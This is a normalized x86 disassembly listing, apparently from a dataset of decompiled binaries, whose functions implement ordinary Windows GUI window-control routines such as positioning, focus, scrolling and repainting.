mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_455244
mov ebp eax
test ebp ebp
je r-xdata
mov eax [ edi + 0x8 ]
call sub_45514c
mov [ esp ] al
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
lea edx [ edi + 0x4 ]
mov cl [ esp ]
mov eax esi
mov si 0xffbb
call sub_40349c
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_443534
test al al
jne r-xdata
sub_44359c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443534
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4435bc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_443534
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4435fc
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
mov bl 0x1
mov eax esi
call sub_455244
mov ebp eax
test ebp ebp
je r-xdata
test [ esi + 0x51 ] 0x10
jne r-xdata
cmp esi ebp
je r-xdata
xor ebx ebx
mov al [ edi + 0x4 ]
mov [ esp ] al
mov edx esp
mov eax esi
mov si 0xffba
call sub_40349c
xor eax eax
mov al [ esp ]
mov [ edi + 0x4 ] ax
cmp [ edi + 0x4 ] 0x0
je r-xdata
cmp [ ebp + 0x22d ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax ebp
call sub_4435fc
test al al
jne r-xdata
sub_443660
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4435fc
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_443680
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov [ ebp - 0x5 ] 0x0
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
mov al [ ebp - 0x5 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_441328
mov esi eax
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_4412ec
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
test [ ebx + 0x52 ] 0x1
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x8 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx 0x112
mov eax ebx
call sub_43efc4
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax ebx
call sub_443680
pop ecx
test al al
je r-xdata
mov [ ebp - 0x5 ] 0x1
jmp r-xdata
sub_443730
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
and eax 0xfff0
cmp eax 0xf100
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x20
je r-xdata
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
push ebp
mov eax ebx
call sub_443680
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x8 ] 0x2d
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
call GetCapture
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp ebx [ eax + 0x44 ]
je r-xdata
mov eax ebx
call sub_455244
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp - 0x4 ]
push eax
xor ecx ecx
mov edx 0xb017
mov eax esi
call sub_43efc4
test eax eax
jne r-xdata
sub_4437d8
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_442278
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_4437f8
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov si [ ebx + 0x4 ]
cmp si 0x1
je r-xdata
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_442278
test al al
jne r-xdata
cmp si 0x2
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44382c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax [ ebx + 0x8 ]
call sub_442278
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
sub_44384c
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
movzx eax [ rw-data ]
push eax
mov eax [ esi + 0x180 ]
push eax
call RemovePropA
pop esi
retn
sub_44389c
push esi
mov esi eax
test [ esi + 0x1c ] 0x10
je r-xdata
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
cmp [ esi + 0x30 ] 0x0
je r-xdata
mov [ edx + 0xc ] 0x1
pop esi
retn
sub_4438c0
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] dl
mov ebp eax
mov dl [ esp ]
mov eax ebp
call sub_43d0c4
mov ebx eax
cmp [ ebp + 0x57 ] 0x0
je r-xdata
mov eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebp
call sub_441328
mov edi eax
dec edi
cmp edi 0x0
jl r-xdata
test [ esp ] bl
jne r-xdata
mov edx edi
mov eax ebp
call sub_4412ec
mov dl [ esp ]
mov si 0xffd1
call sub_40349c
or bl al
dec edi
cmp edi 0xffffffff
jne r-xdata
sub_443918
push ebx
push esi
push edi
mov edi edx
mov ebx eax
or [ ebx + 0x54 ] 0x4
mov dl 0x1
mov eax ebx
mov si 0xffd1
call sub_40349c
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_44393c
push ebx
push esi
push edi
mov edi edx
mov ebx eax
xor edx edx
mov eax ebx
mov si 0xffd1
call sub_40349c
and eax 0x7f
mov [ edi + 0xc ] eax
pop edi
pop esi
pop ebx
retn
sub_443974
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fa98
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov dx 0xb03d
mov eax ebx
call sub_441388
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax ebx
call sub_441b98
sub_4439ac
push ebx
push esi
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
mov eax ebx
mov si 0xffc2
call sub_40349c
pop esi
pop ebx
retn
mov eax ebx
call sub_43e454
test al al
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x3c ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x3c ]
call sub_404534
push eax
call LoadKeyboardLayoutA
push 0x1
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x38 ]
call sub_404534
push eax
call LoadKeyboardLayoutA
jmp r-xdata
sub_443a2c
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_441f78
test al al
jne r-xdata
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_43fb6c
sub_443a8c
push ebx
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
test [ ebx + 0x1c ] 0x10
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_441cec
test [ ebx + 0x51 ] 0x4
je r-xdata
xor edx edx
mov eax ebx
call sub_4410e8
pop ebx
retn
sub_443abc
xor edx edx
mov dl [ eax + 0x1a6 ]
movzx edx [ edx * 2 + rw-data ]
push edx
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
retn
sub_443ae4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax ebx
call sub_4448fc
test al al
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor edx edx
mov eax ebx
call sub_4410e8
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb eax eax
push eax
mov eax [ ebx + 0x180 ]
push eax
call EnableWindow
sub_443b54
push ebx
mov ebx eax
mov eax ebx
call sub_43f9d8
mov eax ebx
call sub_4448fc
test al al
je r-xdata
mov dx 0xb008
mov eax ebx
call sub_441388
pop ebx
retn
push 0x0
mov eax [ ebx + 0x68 ]
call sub_41d414
mov ecx eax
mov edx 0x30
mov eax ebx
call sub_43efc4
sub_443b90
push ebx
add esp 0xfffffff8
mov ebx eax
call GetCapture
test eax eax
jne r-xdata
pop ecx
pop edx
pop ebx
retn
push esp
call GetCursorPos
mov eax esp
xor edx edx
call sub_43c6a4
cmp ebx eax
jne r-xdata
push 0x1
mov eax ebx
call sub_4445f8
mov ecx eax
mov edx 0x20
mov eax ebx
call sub_43efc4
sub_443bd0
push esi
mov esi eax
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov eax esi
call sub_4448fc
test al al
je r-xdata
pop esi
retn
push 0x37
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax esi
call sub_4445f8
push eax
call SetWindowPos
cmp [ esi + 0x57 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
sub_443c10
push ebx
mov ebx eax
test [ ebx + 0x50 ] 0x10
je r-xdata
mov dx 0xb011
mov eax ebx
call sub_441388
pop ebx
retn
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax ebx
call sub_4448fc
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov eax ebx
call sub_444500
sub_443c50
push ebx
mov ebx eax
cmp [ ebx + 0x1a9 ] 0x0
je r-xdata
pop ebx
retn
cmp [ edx + 0x4 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov dl [ eax + 0x1a5 ]
mov eax ebx
call sub_444738
cmp [ edx + 0x8 ] 0x0
setne al
mov edx eax
mov eax ebx
call sub_444738
jmp r-xdata
mov [ ebx + 0x1a9 ] 0x1
sub_443cb0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx edx
mov esi eax
mov edi [ ebx + 0x8 ]
mov al [ ebx + 0x4 ]
sub al 0x4
jb r-xdata
cmp [ edi + 0xc ] 0x0
je r-xdata
dec al
je r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ edi + 0xc ]
call sub_43ea20
jmp r-xdata
push 0x0
lea ecx [ esp + 0x4 ]
mov edx edi
mov eax esi
call sub_43d93c
lea edx [ esp + 0x4 ]
xor ecx ecx
mov eax esi
call sub_441ee4
mov ebp eax
mov [ ebx + 0xc ] ebp
test ebp ebp
jne r-xdata
jmp r-xdata
mov [ ebx + 0xc ] esi
sub_443d20
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43fb10
mov edx esi
mov eax ebx
call sub_441348
pop esi
pop ebx
retn
sub_443d3c
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov [ esp ] eax
mov [ esp + 0x4 ] 0x1
mov eax [ esp ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov ecx [ ebp + 0x8 ]
movzx edx [ ebp + 0x4 ]
mov eax 0xb016
call sub_43ace0
test eax eax
jne r-xdata
mov ebx [ esp ]
test ebx ebx
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov [ esp + 0x4 ] 0x0
mov eax [ esp ]
call sub_455244
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
mov si 0xffd6
call sub_40349c
mov edi eax
test edi edi
je r-xdata
mov edx ebp
mov eax ebx
mov si 0xffab
call sub_40349c
test al al
jne r-xdata
mov ebx [ ebx + 0x30 ]
test ebx ebx
jne r-xdata
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov edx ebp
mov eax edi
mov si 0xffef
call sub_40349c
test al al
jne r-xdata
sub_443dd0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov dx [ esi + 0x4 ]
mov eax ebx
call sub_445764
mov edx esi
mov eax ebx
call sub_443d3c
test al al
jne r-xdata
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_43efc4
test eax eax
jne r-xdata
xor edi edi
movzx eax [ esi + 0x4 ]
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
mov edi 0x1
jmp r-xdata
sub eax 0x2
je r-xdata
mov edi 0x4
sub eax 0x3
je r-xdata
test edi edi
je r-xdata
jmp r-xdata
push 0x0
movzx ecx [ esi + 0x4 ]
mov edx 0xb01e
mov eax ebx
call sub_43efc4
test eax eax
jne r-xdata
sub eax 0x6
je r-xdata
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_43efc4
test eax edi
jne r-xdata
mov edi 0x2
jmp r-xdata
sub eax 0x4
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_455244
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_43efc4
test eax eax
jne r-xdata
jmp r-xdata
sub_443eb4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov di [ esi + 0x4 ]
movzx eax di
cmp eax 0x1b
jg r-xdata
add eax 0xffffffdb
sub eax 0x4
jb r-xdata
je r-xdata
push 0x0
movzx ecx di
mov edx 0xb01e
mov eax ebx
call sub_43efc4
mov [ esi + 0xc ] eax
sub eax 0x2
jne r-xdata
sub eax 0x3
je r-xdata
sub eax 0x6
je r-xdata
sub eax 0x4
je r-xdata
jmp r-xdata
sub_443f08
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
mov [ esi + 0xc ] 0x1
push 0x0
xor ecx ecx
mov edx 0x87
mov eax ebx
call sub_43efc4
test al 0x80
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_455244
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_43efc4
test eax eax
jne r-xdata
sub_443f54
push ebx
push esi
mov esi edx
mov ebx eax
mov [ esi + 0xc ] 0x1
mov edx esi
mov eax ebx
call sub_443d3c
test al al
jne r-xdata
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x10
jne r-xdata
xor eax eax
mov [ esi + 0xc ] eax
push ebx
movzx ecx [ esi + 0x4 ]
mov edx 0xb02e
mov eax ebx
call sub_43efc4
test eax eax
jne r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_455244
movzx ecx [ esi + 0x4 ]
mov edx 0xb005
call sub_43efc4
test eax eax
jne r-xdata
sub_443fb0
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop esi
pop ebx
retn
cmp [ esi + 0x4 ] 0x20
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax ebx
call sub_455244
movzx ecx [ esi + 0x4 ]
mov edx 0xb006
call sub_43efc4
mov [ esi + 0xc ] eax
sub_443fe4
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x40 ]
jne r-xdata
mov eax ebx
call sub_4448fc
test al al
je r-xdata
cmp edi [ ebx + 0x44 ]
jne r-xdata
mov [ ebx + 0x40 ] esi
mov [ ebx + 0x44 ] edi
mov eax [ ebp + 0xc ]
mov [ ebx + 0x48 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x4c ] eax
mov eax ebx
call sub_4448fc
test al al
je r-xdata
mov eax [ ebx + 0x180 ]
push eax
call IsIconic
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
cmp eax [ ebx + 0x48 ]
jne r-xdata
mov eax ebx
call sub_43d44c
mov eax ebx
mov si 0xffd0
call sub_40349c
mov [ ebp - 0x2c ] 0x2c
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call GetWindowPlacement
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_43d798
lea esi [ ebp - 0x3c ]
lea edi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPlacement
push 0x14
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
push edi
push esi
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
jmp r-xdata
mov eax [ ebp + 0x8 ]
cmp eax [ ebx + 0x4c ]
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_4440bc
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax ebp
call sub_441328
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax ebp
call sub_4412ec
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov si 0xffec
call sub_40349c
inc edi
dec ebx
jne r-xdata
sub_444104
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_440e90
xor eax eax
push ebp
push sub_4441a2
push [ fs : eax ]
mov [ fs : eax ] esp
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_4440bc
cmp esi ebx
je r-xdata
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43da14
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4441a9
mov eax [ ebp - 0x4 ]
call sub_440e98
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call sub_4061f4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
push esi
push ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call sub_4061f4
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_4441b0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov edi eax
mov ebx [ edi + 0x180 ]
test ebx ebx
je r-xdata
xor eax eax
jmp r-xdata
push ebx
call IsWindowVisible
test eax eax
jne r-xdata
mov [ esp + 0x8 ] al
cmp [ esp + 0x8 ] 0x0
je r-xdata
mov al 0x1
mov eax edi
call sub_441328
mov esi eax
dec esi
test esi esi
jl r-xdata
push 0x0
push 0x0
mov eax [ esp + 0xc ]
push eax
mov eax [ esp + 0xc ]
push eax
mov eax [ edi + 0x180 ]
push eax
call ScrollWindow
mov eax edi
call sub_440eb8
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov eax [ esp ]
add [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
add [ ebx + 0x44 ] eax
jmp r-xdata
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
inc ebp
dec esi
jne r-xdata
cmp [ esp + 0x8 ] 0x0
jne r-xdata
mov edx ebp
mov eax edi
call sub_4412ec
mov ebx eax
mov eax ebx
mov edx [ r-xdata ]
call sub_40342c
test al al
je r-xdata
push 0x14
mov eax ebx
mov edx [ eax + 0x4c ]
push edx
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x44 ]
add edx [ esp + 0x10 ]
push edx
mov edx [ eax + 0x40 ]
add edx [ esp + 0x10 ]
push edx
push 0x0
mov eax [ eax + 0x180 ]
push eax
call SetWindowPos
sub_4442a0
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ eax + 0x198 ]
test edx edx
je r-xdata
mov eax [ eax + 0x19c ]
mov edx ebx
call sub_413e40
mov edi eax
test edi edi
jl r-xdata
sub esi [ edx + 0x8 ]
cmp [ ebx + 0x180 ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
mov edx [ eax + 0x19c ]
mov eax [ edx + 0x8 ]
test esi esi
jge r-xdata
test esi esi
jne r-xdata
cmp eax esi
jg r-xdata
xor esi esi
mov eax [ ebx + 0x30 ]
mov ebp [ eax + 0x19c ]
mov eax [ ebp + 0x8 ]
dec eax
cmp esi eax
jne r-xdata
mov eax 0x1
jmp r-xdata
cmp edi esi
je r-xdata
mov esi eax
dec esi
cmp edi esi
jge r-xdata
xor eax eax
jmp r-xdata
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
push eax
mov eax [ ebx + 0x180 ]
push eax
call SetWindowPos
mov eax edx
mov edx edi
call sub_413cd4
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x19c ]
mov ecx ebx
mov edx esi
call sub_413e60
cmp edi esi
jle r-xdata
lea edx [ esi + 0x1 ]
mov eax ebp
call sub_413de4
call sub_4445f8
jmp r-xdata
mov eax ebp
mov edx esi
call sub_413de4
call sub_4445f8
sub_444378
push ebx
push esi
mov ebx [ eax + 0x30 ]
test ebx ebx
je r-xdata
mov ecx [ eax + 0x180 ]
test ecx ecx
je r-xdata
test dl dl
je r-xdata
pop esi
pop ebx
retn
push 0x3
push 0x0
push 0x0
push 0x0
push 0x0
and edx 0x7f
movzx edx [ edx * 2 + rw-data ]
push edx
push ecx
call SetWindowPos
xor ecx ecx
mov edx [ ebx + 0x19c ]
mov ecx [ edx + 0x8 ]
dec ecx
jmp r-xdata
add ecx edx
mov edx ecx
call sub_4442a0
pop esi
pop ebx
retn
mov edx [ esi + 0x8 ]
xor edx edx
mov esi [ ebx + 0x198 ]
test esi esi
je r-xdata
sub_4443d8
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx + 0x1c ] 0x10
je r-xdata
mov eax ebx
call sub_4445f8
push eax
call GetDC
push 0x12
push 0x0
mov eax ebx
call sub_4445f8
push eax
call GetDCEx
jmp r-xdata
mov edx [ ebx + 0x180 ]
mov [ esi ] edx
pop esi
pop ebx
retn
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6f8
call sub_403a2c
test eax eax
jne r-xdata
sub_44443c
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax ebx
call sub_4448fc
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
push 0x0
mov ecx 0x1
mov edx 0xb034
call sub_43efc4
test [ ebx + 0x50 ] 0x40
setne al
xor al 0x1
neg al
sbb eax eax
push eax
push 0x0
mov eax [ ebx + 0x180 ]
push eax
call InvalidateRect
call sub_42c584
call sub_42c664
test al al
je r-xdata
mov eax ebx
call sub_441328
mov edi eax
dec edi
test edi edi
jl r-xdata
inc edi
xor esi esi
inc esi
dec edi
jne r-xdata
mov edx esi
mov eax ebx
call sub_4412ec
mov edx [ eax ]
call [ edx + 0x7c ]
mov edx esi
mov eax ebx
call sub_4412ec
test [ eax + 0x52 ] 0x4
je r-xdata
sub_444500
push ebx
add esp 0xfffffff0
mov ebx eax
mov edx esp
mov eax ebx
call sub_43d798
push 0x1
push 0x1
lea eax [ esp + 0x8 ]
push eax
call InflateRect
push 0xffffffff
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x30 ]
mov eax [ eax + 0x180 ]
push eax
call InvalidateRect
add esp 0x10
pop ebx
retn
sub_444538
push ebx
push esi
push ecx
mov ebx eax
mov [ esp ] 0x0
mov eax ebx
call sub_455244
mov esi eax
test esi esi
je r-xdata
mov al [ esp ]
pop edx
pop esi
pop ebx
retn
cmp esi ebx
je r-xdata
mov [ esp ] 0x1
cmp [ ebx + 0x57 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
mov ebx [ ebx + 0x30 ]
cmp esi ebx
jne r-xdata
sub_444578
push ebx
mov ebx eax
mov eax ebx
call sub_455244
test eax eax
je r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx ebx
call sub_458fb0
pop ebx
retn
mov eax ebx
call sub_45526c
mov eax ebx
call sub_4445f8
push eax
call SetFocus
jmp r-xdata
pop ebx
retn
sub_4445b0
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
je r-xdata
xor eax eax
pop ebx
retn
call GetFocus
cmp eax [ ebx + 0x180 ]
je r-xdata
mov al 0x1
pop ebx
retn
sub_4445d4
push ebx
mov ebx eax
cmp [ ebx + 0x180 ] 0x0
jne r-xdata
pop ebx
retn
mov eax [ ebx + 0x30 ]
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x94 ]
call sub_4445d4
sub_44460c
push ebx
push esi
push edi
push ebp
mov ebx edx
mov edi eax
push 0x0
push ebx
xor ecx ecx
mov edx 0x7fffffff
mov eax 0x7fffffff
call sub_4129b0
mov eax edi
call sub_441328
mov esi eax
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebp ebp
mov edx [ ebx ]
cmp edx [ eax + 0x40 ]
jle r-xdata
test [ eax + 0x1c ] 0x10
je r-xdata
mov edx [ ebx + 0x4 ]
cmp edx [ eax + 0x44 ]
jle r-xdata
mov edx [ eax + 0x40 ]
mov [ ebx ] edx
inc ebp
dec esi
jne r-xdata
test [ eax + 0x51 ] 0x4
jne r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
cmp edx [ ebx + 0x8 ]
jle r-xdata
mov edx [ eax + 0x44 ]
mov [ ebx + 0x4 ] edx
mov edx ebp
mov eax edi
call sub_4412ec
cmp [ eax + 0x57 ] 0x0
jne r-xdata
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
cmp edx [ ebx + 0xc ]
jle r-xdata
mov edx [ eax + 0x40 ]
add edx [ eax + 0x48 ]
mov [ ebx + 0x8 ] edx
mov edx [ eax + 0x44 ]
add edx [ eax + 0x4c ]
mov [ ebx + 0xc ] edx
sub_4446a0
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
mov [ ebx ] eax
xor eax eax
mov [ ebx + 0x4 ] eax
push ebx
mov eax esi
call sub_4445f8
push eax
call ClientToScreen
pop esi
pop ebx
retn
sub_4446d8
push ebx
push esi
mov ebx eax
test [ ebx + 0x1c ] 0x1
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_4448fc
test al al
je r-xdata
push 0x16
mov eax [ ebx + 0x4c ]
push eax
mov eax [ ebx + 0x48 ]
push eax
push 0x0
push 0x0
push 0x0
mov eax ebx
call sub_4445f8
push eax
call SetWindowPos
mov eax ebx
mov si 0xffd0
call sub_40349c
sub_444794
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x30 ]
test esi esi
je r-xdata
or eax 0xffffffff
pop esi
pop ebx
retn
mov eax [ esi + 0x194 ]
mov edx ebx
call sub_413e40
pop esi
pop ebx
retn
sub_4447b8
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
mov eax ebx
call sub_444794
movsx eax ax
test eax eax
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx [ ebx + 0x30 ]
mov ebp [ edx + 0x194 ]
mov edx [ ebp + 0x8 ]
test si si
jge r-xdata
movsx ecx si
cmp edx ecx
jg r-xdata
xor esi esi
movsx edi si
